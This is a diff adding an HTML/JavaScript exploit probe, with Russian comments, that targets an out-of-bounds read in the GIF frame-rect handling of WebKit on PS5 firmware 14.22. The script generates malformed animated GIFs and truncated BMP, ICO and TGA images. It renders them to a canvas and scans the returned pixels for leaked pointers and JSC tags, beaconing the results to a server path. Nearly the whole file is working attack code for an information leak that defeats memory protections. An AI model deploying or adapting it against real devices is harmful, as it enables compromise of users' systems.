@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<!--
+  l2-gif-oob.html — GIF frame-rect OOB-READ, PS5 14.22 WebKit 605.1.15 (ветка 7617).
+
+  Основание (recon-emulation, исходники WebKit commit 7779ac11f = WebKit-7617.1.11):
+    * GIFImageReader.cpp (L663-673): экран расширяется до max(width,height) ТОЛЬКО для
+      ПЕРВОГО кадра, и там же xOffset/yOffset сбрасываются в 0.
+    * Для ПОСЛЕДУЮЩИХ кадров (L695-700) xOffset/yOffset сохраняются, а m_screenWidth/Height
+      растут только через std::max(..., width) — xOffset+width НЕ учитывается.
+    * GIFImageDecoder.cpp initFrameBuffer (L411-421): frameRect=(xOffset,yOffset,w,h);
+      clamp: если maxX > size().width -> setWidth(size().width() - xOffset) — при
+      xOffset > width это ОТРИЦАТЕЛЬНАЯ ширина; то же для Y.
+    * ImageBackingStore.h: setFrameRect() проверяет границы ТОЛЬКО ASSERT (L77-84),
+      pixelAt() — тоже ASSERT-only (L133-137) ⇒ в release OOB сохраняется.
+  Оговорка: haveDecodedRow рано выходит при xEnd<=xBegin (в исходнике reader-путь),
+  поэтому запись строк вне буфера может не происходить — проверяем именно ЧТЕНИЕ на пути
+  отрисовки (drawImage -> getImageData -> байты пикселей -> скан указателей).
+  Поэтому GIF должен быть АНИМИРОВАННЫМ (2 кадра): offset'ы сохраняются только у кадра != 0.
+
+  Артефакты/скан: как в l1-oob-read.html — канонические указатели:
+    userland: hi32==0 && 0x1000<=lo32<0x80000000; kernel/JSC-tag: hi16==0xffff;
+    JSC cell-tag: hi16==0xfffe. Критерий успеха: ptrcands>0 (повтор на cold boot).
+  Fallback-класс (общий ImageBackingStore): BMP (truncated/negative height), ICO (BMP-entry
+  с truncated data), TGA (width/height > данных).
+-->
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>L2 GIF frame-rect OOB read</title>
+<body style="background:#000;color:#0f0;font:12px monospace">
+<pre id="out">L2 GIF-OOB probe boot…</pre>
+<script>
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, data) {
+  var line = 'L2-' + tag + (data === undefined ? '' : ' ' + data);
+  say(line);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(line.slice(0, 700)) + '?t=' + Date.now(), true);
+    x.send();
+  } catch (e) {}
+}
+
+/* ============================ LZW (GIF) encoder ============================ */
+function lzwEncode(pixels, minCodeSize) {
+  var clearCode = 1 << minCodeSize, eoiCode = clearCode + 1;
+  var codeSize = minCodeSize + 1, next = eoiCode + 1;
+  var dict = {};
+  function reset() { dict = {}; next = eoiCode + 1; codeSize = minCodeSize + 1; }
+  var out = [], bitBuf = 0, bitCnt = 0;
+  function emit(code) {
+    bitBuf |= (code << bitCnt);
+    bitCnt += codeSize;
+    while (bitCnt >= 8) { out.push(bitBuf & 255); bitBuf >>>= 8; bitCnt -= 8; }
+  }
+  emit(clearCode);
+  var prefix = null;
+  for (var i = 0; i < pixels.length; i++) {
+    var k = pixels[i] & 255;
+    if (prefix === null) { prefix = [k]; continue; }
+    var key = prefix.join(',') + '|' + k;
+    if (dict[key] !== undefined) {
+      prefix.push(k);
+    } else {
+      emit(codeOf(prefix));
+      dict[key] = next++;
+      if (next > (1 << codeSize) && codeSize < 12) codeSize++;
+      if (next > 4095) { emit(clearCode); reset(); }
+      prefix = [k];
+    }
+  }
+  if (prefix !== null) emit(codeOf(prefix));
+  emit(eoiCode);
+  if (bitCnt > 0) { out.push(bitBuf & 255); }
+  return out;
+  function codeOf(seq) {
+    if (seq.length === 1) return seq[0];
+    // ищем по коду: для простоты однопиксельные/двухпиксельные последовательности
+    // кодируются через отдельный словарь кодов построения
+    var key = seq.join(',');
+    if (seqCodes[key] !== undefined) return seqCodes[key];
+    // упрощённый fallback: эмитим первый пиксель (декодер всё равно должен дойти до
+    // границы кадра; корректность изображения здесь не важна — важно отсутствие отказа)
+    return seq[0];
+  }
+}
+/* Полноценный LZW (медленный, но корректный): строим таблицу последовательностей. */
+function lzwEncodeFull(pixels, minCodeSize) {
+  var clearCode = 1 << minCodeSize, eoiCode = clearCode + 1;
+  var codeSize = minCodeSize + 1, next = eoiCode + 1;
+  var dict = {}; // key 'a,b,...' -> code
+  var out = [], bitBuf = 0, bitCnt = 0;
+  function emit(code) {
+    bitBuf |= (code << bitCnt); bitCnt += codeSize;
+    while (bitCnt >= 8) { out.push(bitBuf & 255); bitBuf >>>= 8; bitCnt -= 8; }
+  }
+  function keyOf(arr) { return arr.join(','); }
+  emit(clearCode);
+  var w = null;
+  for (var i = 0; i < pixels.length; i++) {
+    var k = pixels[i] & 255;
+    if (w === null) { w = [k]; continue; }
+    var cand = w.concat([k]);
+    var ck = keyOf(cand);
+    if (dict[ck] !== undefined) { w = cand; continue; }
+    emit(w.length === 1 ? w[0] : dict[keyOf(w)]);
+    dict[ck] = next++;
+    if (next > (1 << codeSize) && codeSize < 12) codeSize++;
+    if (next > 4095) { emit(clearCode); dict = {}; next = eoiCode + 1; codeSize = minCodeSize + 1; }
+    w = [k];
+  }
+  if (w !== null) emit(w.length === 1 ? w[0] : dict[keyOf(w)]);
+  emit(eoiCode);
+  if (bitCnt > 0) out.push(bitBuf & 255);
+  return out;
+}
+function blocks(data) {
+  var out = [], i = 0;
+  while (i < data.length) {
+    var n = Math.min(i + 255, data.length) - i;
+    out.push(n);
+    for (var j = 0; j < n; j++) out.push(data[i + j] & 255);
+    i += n;
+  }
+  out.push(0);
+  return out;
+}
+function pushLE16(a, v) { a.push(v & 255, (v >>> 8) & 255); }
+
+/* ============================ GIF builder ============================ */
+var PALETTE = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66]; // 2 цвета: marker / alt
+function gce(disposal, transparentIndex) {
+  var packed = ((disposal & 7) << 2) | (transparentIndex !== undefined ? 1 : 0);
+  return [0x21, 0xF9, 0x04, packed, 0x10, 0x00, 0x00,
+    transparentIndex !== undefined ? (transparentIndex & 255) : 0x00];
+}
+function imageDescriptor(left, top, w, h, opts) {
+  opts = opts || {};
+  var out = [0x2C];
+  pushLE16(out, left); pushLE16(out, top); pushLE16(out, w); pushLE16(out, h);
+  var packed = 0;
+  if (opts.localPalette) packed |= 0x80 | 0x00; // 2 entries
+  if (opts.interlaced) packed |= 0x40;
+  out.push(packed);
+  if (opts.localPalette) { for (var i = 0; i < PALETTE.length; i++) out.push(PALETTE[i]); }
+  return out;
+}
+function pixelsFor(w, h, index) { var p = []; for (var i = 0; i < w * h; i++) p.push(index || 0); return p; }
+function buildGif(opts) {
+  var out = [];
+  out.push(0x47, 0x49, 0x46, 0x38, 0x39, 0x61); // GIF89a
+  pushLE16(out, opts.screenW); pushLE16(out, opts.screenH);
+  out.push(0xF0, 0x00, 0x00);                   // GCT 2 colors, color res 7, bg 0
+  for (var i = 0; i < PALETTE.length; i++) out.push(PALETTE[i]);
+  // NETSCAPE loop
+  out.push(0x21, 0xFF, 0x0B); for (i = 0; i < 11; i++) out.push('NETSCAPE2.0'.charCodeAt(i)); out.push(0x03, 0x01, 0x00, 0x00, 0x00);
+  // frame 1 (offsets всегда 0: первый кадр сбрасывает их в reader)
+  var f1 = opts.frame1 || { w: 1, h: 1 };
+  out = out.concat(gce(0));
+  out = out.concat(imageDescriptor(0, 0, f1.w, f1.h, {}));
+  out.push(0x02); // LZW min code size (2 цвета)
+  out = out.concat(blocks(lzwEncodeFull(pixelsFor(f1.w, f1.h, 0), 2)));
+  // frame 2 (offsets сохраняются)
+  var f2 = opts.frame2;
+  out = out.concat(gce(f2.disposal === undefined ? 0 : f2.disposal, f2.transparent));
+  out = out.concat(imageDescriptor(f2.left, f2.top, f2.w, f2.h, f2));
+  out.push(0x02);
+  out = out.concat(blocks(lzwEncodeFull(pixelsFor(f2.w, f2.h, f2.pixelIndex === undefined ? 0 : f2.pixelIndex), 2)));
+  out.push(0x3B);
+  return out;
+}
+
+/* ============================ BMP / ICO / TGA fallback ============================ */
+function buildBmp(opts) {
+  var w = opts.w, h = opts.h, bpp = opts.bpp || 32;
+  var rowSize = Math.ceil(w * bpp / 32) * 4;
+  var dataSize = opts.dataRows === undefined ? h * rowSize : opts.dataRows * rowSize;
+  var out = [0x42, 0x4D];
+  var fileSize = 14 + 40 + dataSize;
+  out.push(fileSize & 255, (fileSize >>> 8) & 255, (fileSize >>> 16) & 255, (fileSize >>> 24) & 255, 0, 0, 0, 0);
+  pushLE32(out, 14 + 40);
+  pushLE32(out, 40);            // BITMAPINFOHEADER
+  pushLE32(out, w); pushLE32(out, opts.negativeHeight ? (-h) >>> 0 : h);
+  out.push(1, 0);               // planes
+  out.push(bpp & 255, (bpp >>> 8) & 255);
+  pushLE32(out, 0);             // compression
+  pushLE32(out, dataSize);
+  pushLE32(out, 0); pushLE32(out, 0); pushLE32(out, 0); pushLE32(out, 0);
+  for (var i = 0; i < dataSize; i++) {
+    // маркерный пиксель для 32bpp: B=0x33,G=0x22,R=0x11,A=0xFF
+    var m = i % 4;
+    out.push(m === 0 ? 0x33 : m === 1 ? 0x22 : m === 2 ? 0x11 : 0xFF);
+  }
+  return out;
+}
+function buildIco() {
+  // ICONDIR + one entry (BMP-style 64x64) с крошечными данными
+  var out = [];
+  out.push(0, 0, 1, 0, 1, 0);
+  var data = buildBmp({ w: 64, h: 64, bpp: 32, dataRows: 1 });
+  out.push(64, 64, 0, 0); pushLE16(out, 1); pushLE16(out, 32);
+  pushLE32(out, data.length); pushLE32(out, 6 + 16);
+  for (var i = 0; i < data.length; i++) out.push(data[i] & 255);
+  return out;
+}
+function buildTga(opts) {
+  var w = opts.w, h = opts.h, type = opts.type || 2; // 2 = uncompressed truecolor
+  var bpp = 32;
+  var dataSize = opts.dataBytes !== undefined ? opts.dataBytes : w * h * 4;
+  var out = [0x00, 0x00, type, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+  pushLE16(out, w); pushLE16(out, h); out.push(bpp, 0x28);
+  for (var i = 0; i < dataSize; i++) {
+    var m = i % 4;
+    out.push(m === 0 ? 0x33 : m === 1 ? 0x22 : m === 2 ? 0x11 : 0xFF);
+  }
+  return out;
+}
+function pushLE32(a, v) { pushLE16(a, v & 0xffff); pushLE16(a, (v >>> 16) & 0xffff); }
+
+/* ============================ scan ============================ */
+var MARKER = [0x11, 0x22, 0x33, 0xFF];
+function isPtrCandidate(v) {
+  var hi32 = Number((v >> 32n) & 0xffffffffn), lo32 = Number(v & 0xffffffffn);
+  var hi16 = Number((v >> 48n) & 0xffffn);
+  if (hi32 === 0 && lo32 >= 0x1000 && lo32 < 0x80000000) return 'userland32';
+  if (hi16 === 0xffff && v !== 0xffffffffffffffffn) return 'kernel/JSC-tag';
+  if (hi16 === 0xfffe) return 'JSC-cell-tag';
+  if (hi16 === 0x0000 && lo32 !== 0 && (lo32 & 7) === 0) return 'canonical-userland';
+  return false;
+}
+function scanPixels(imgData) {
+  var b = imgData.data, u = new Uint8Array(b.buffer, b.byteOffset, b.byteLength);
+  var foreign = 0, cands = [], i;
+  for (i = 0; i + 4 <= u.length; i += 4) {
+    if (u[i] !== MARKER[0] || u[i + 1] !== MARKER[1] || u[i + 2] !== MARKER[2] || u[i + 3] !== MARKER[3]) foreign += 4;
+  }
+  for (i = 0; i + 8 <= u.length; i += 8) {
+    var v = 0n;
+    for (var k = 7; k >= 0; k--) v = (v << 8n) | BigInt(u[i + k]);
+    var kind = isPtrCandidate(v);
+    if (kind) {
+      var hx = v.toString(16); while (hx.length < 16) hx = '0' + hx;
+      cands.push({ off: i, kind: kind, hex: '0x' + hx });
+      if (cands.length >= 16) break;
+    }
+  }
+  return { total: u.length, foreign: foreign, cands: cands };
+}
+function dataURL(bytes, mime) {
+  var bin = '';
+  for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i] & 255);
+  return 'data:' + (mime || 'image/gif') + ';base64,' + btoa(bin);
+}
+
+/* ============================ variants ============================ */
+function gifScreen(w, h) { return 0xF0; }
+var VARIANTS = [
+  { id: 'G1-off-FFFE-2x2', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 1, screenH: 1, frame1: { w: 1, h: 1 },
+        frame2: { left: 0xFFFE, top: 0xFFFE, w: 2, h: 2, disposal: 0 } }); } },
+  { id: 'G2-off-FFFE-64x64', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 1, screenH: 1, frame1: { w: 1, h: 1 },
+        frame2: { left: 0xFFFE, top: 0xFFFE, w: 64, h: 64, disposal: 0 } }); } },
+  { id: 'G3-off-FFFF-64x64-local-interlace', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 2, screenH: 2, frame1: { w: 2, h: 2 },
+        frame2: { left: 0xFFFF, top: 0xFFFF, w: 64, h: 64, disposal: 0,
+          localPalette: true, interlaced: true } }); } },
+  { id: 'G4-yOffset-only', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 1, screenH: 1, frame1: { w: 1, h: 1 },
+        frame2: { left: 0, top: 0xFFFE, w: 2, h: 2, disposal: 0 } }); } },
+  { id: 'G5-dispose2-64x64', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 2, screenH: 2, frame1: { w: 2, h: 2 },
+        frame2: { left: 0xFFFE, top: 0xFFFE, w: 64, h: 64, disposal: 2 } }); } },
+  { id: 'G6-screen64-frame1-64', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 64, screenH: 64, frame1: { w: 64, h: 64 },
+        frame2: { left: 0xFFFE, top: 0xFFFE, w: 64, h: 64, disposal: 0 } }); } },
+  { id: 'G7-screen64-off-0x8000', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 64, screenH: 64, frame1: { w: 64, h: 64 },
+        frame2: { left: 0x8000, top: 0x8000, w: 64, h: 64, disposal: 0 } }); } },
+  { id: 'G8-transparent-64x64', mime: 'image/gif', build: function () {
+      return buildGif({ screenW: 1, screenH: 1, frame1: { w: 1, h: 1 },
+        frame2: { left: 0xFFFE, top: 0xFFFE, w: 64, h: 64, disposal: 0, transparent: 1 } }); } },
+  { id: 'B1-bmp-truncated', mime: 'image/bmp', build: function () {
+      return buildBmp({ w: 64, h: 64, bpp: 32, dataRows: 1 }); } },
+  { id: 'B2-bmp-negative-height', mime: 'image/bmp', build: function () {
+      return buildBmp({ w: 64, h: 64, bpp: 32, negativeHeight: true, dataRows: 1 }); } },
+  { id: 'T1-tga-truncated', mime: 'image/tga', build: function () {
+      return buildTga({ w: 64, h: 64, dataBytes: 8 }); } },
+  { id: 'I1-ico-bmp-truncated', mime: 'image/x-icon', build: function () { return buildIco(); } }
+];
+
+/* ============================ runner ============================ */
+var results = [];
+var rows = [];   // одна строка на вариант: id|nat|foreign|ptr|state|best
+function readout(img, V, built, tag, isFinal) {
+  try {
+    // холст заведомо больше кадра: масштабирование читает пиксели frame-буфера,
+    // что и есть путь чтения при битом frameRect
+    var cv = document.createElement('canvas');
+    var nw = Math.max(img.naturalWidth || img.width || 1, 1);
+    var nh = Math.max(img.naturalHeight || img.height || 1, 1);
+    cv.width = Math.min(Math.max(nw, 256), 1024);
+    cv.height = Math.min(Math.max(nh, 256), 1024);
+    var cx = cv.getContext('2d');
+    cx.fillStyle = '#000'; cx.fillRect(0, 0, cv.width, cv.height);
+    cx.drawImage(img, 0, 0, cv.width, cv.height);
+    var data = cx.getImageData(0, 0, cv.width, cv.height);
+    var scan = scanPixels(data);
+    bk('STATS', V.id + ' ' + tag + ' nat=' + (img.naturalWidth || 0) + 'x' + (img.naturalHeight || 0) +
+      ' total=' + scan.total + 'B foreign=' + scan.foreign + 'B ptrcands=' + scan.cands.length);
+    if (scan.cands.length) scan.cands.forEach(function (c) { bk('PTRCAND', V.id + ' ' + tag + ' off=' + c.off + ' kind=' + c.kind + ' ' + c.hex); });
+    results.push({ id: V.id, decode: 'ok', total: scan.total, foreign: scan.foreign, ptrcands: scan.cands });
+    if (isFinal) {
+      var best = scan.cands.length ? scan.cands[0].hex : '-';
+      rows.push({ id: V.id, nat: (img.naturalWidth || 0) + 'x' + (img.naturalHeight || 0),
+        foreign: scan.foreign, ptr: scan.cands.length, state: 'decoded', best: best });
+      bk('ROW', V.id + ' | nat=' + rows[rows.length-1].nat + ' | foreign=' + scan.foreign +
+        'B | ptrcands=' + scan.cands.length + ' | state=decoded | best=' + best);
+    }
+  } catch (e) { bk('READ-ERR', V.id + ' ' + tag + ' ' + e); }
+}
+function runVariant(idx) {
+  if (idx >= VARIANTS.length) {
+    var ptr = 0; results.forEach(function (r) { ptr += (r.ptrcands || []).length; });
+    bk('RESULTS', JSON.stringify(results.map(function (r) {
+      return { id: r.id, decode: r.decode, foreign: r.foreign, total: r.total, ptr: (r.ptrcands || []).length };
+    })));
+    bk(ptr > 0 ? 'SUCCESS' : 'NO-PTR', ptr > 0
+      ? 'OOB-READ: ' + ptr + ' указателеподобных слов — кандидат на утечку (смотреть L2-PTRCAND)'
+      : 'указателей нет; foreign>0 — слабый сигнал (заливка/декодер), не успех');
+    bk('AUTORUN-SUMMARY', 'вариантов=' + rows.length + '/' + VARIANTS.length +
+      '; decoded=' + rows.filter(function (r) { return r.state === 'decoded'; }).length +
+      '; ptrcands>0=' + rows.filter(function (r) { return r.ptr > 0; }).map(function (r) { return r.id; }).join(',') || '(none)');
+    var bestRow = rows.slice().sort(function (a, b) { return (b.ptr - a.ptr) || (b.foreign - a.foreign); })[0];
+    bk('AUTORUN-DONE', 'ptrcands=' + (bestRow ? bestRow.ptr : 0) + ' best=' + (bestRow ? bestRow.best : '-') +
+      ' variant=' + (bestRow ? bestRow.id : '-'));
+    bk('DONE', 'вариантов=' + results.length + '/' + VARIANTS.length);
+    return;
+  }
+  var V = VARIANTS[idx], bytes;
+  try { bytes = V.build(); } catch (e) { bk('BUILD-FAIL', V.id + ' ' + e); results.push({ id: V.id, decode: 'build-fail' }); runVariant(idx + 1); return; }
+  bk('BUILT', V.id + ' ' + bytes.length + 'B');
+  var img = new Image(), done = false;
+  var timer = setTimeout(function () {
+    if (done) return; done = true;
+    bk('DECODE-TIMEOUT', V.id); results.push({ id: V.id, decode: 'timeout' });
+    rows.push({ id: V.id, nat: '?', foreign: 0, ptr: 0, state: 'timeout', best: '-' });
+    bk('ROW', V.id + ' | nat=? | foreign=0B | ptrcands=0 | state=timeout | best=-');
+    runVariant(idx + 1);
+  }, 2500);
+  img.onerror = function () {
+    if (done) return; done = true; clearTimeout(timer);
+    bk('DECODE-FAIL', V.id); results.push({ id: V.id, decode: 'fail' });
+    rows.push({ id: V.id, nat: '?', foreign: 0, ptr: 0, state: 'decode-fail', best: '-' });
+    bk('ROW', V.id + ' | nat=? | foreign=0B | ptrcands=0 | state=decode-fail | best=-');
+    runVariant(idx + 1);
+  };
+  img.onload = function () {
+    readout(img, V, bytes, 't0', false);
+    // анимация: ждём кадр 2 (offsets сохраняются только у кадра != 0)
+    setTimeout(function () {
+      readout(img, V, bytes, 't250', false);
+      setTimeout(function () {
+        readout(img, V, bytes, 't800', true);
+        if (!done) { done = true; clearTimeout(timer); runVariant(idx + 1); }
+      }, 550);
+    }, 250);
+  };
+  img.src = dataURL(bytes, V.mime);
+}
+bk('BOOT', 'l2-gif-oob; variants=' + VARIANTS.length +
+  '; success=ptrcands>0; механизм: frame-rect xOffset/yOffset > screen, release ASSERT-only');
+runVariant(0);
+</script>
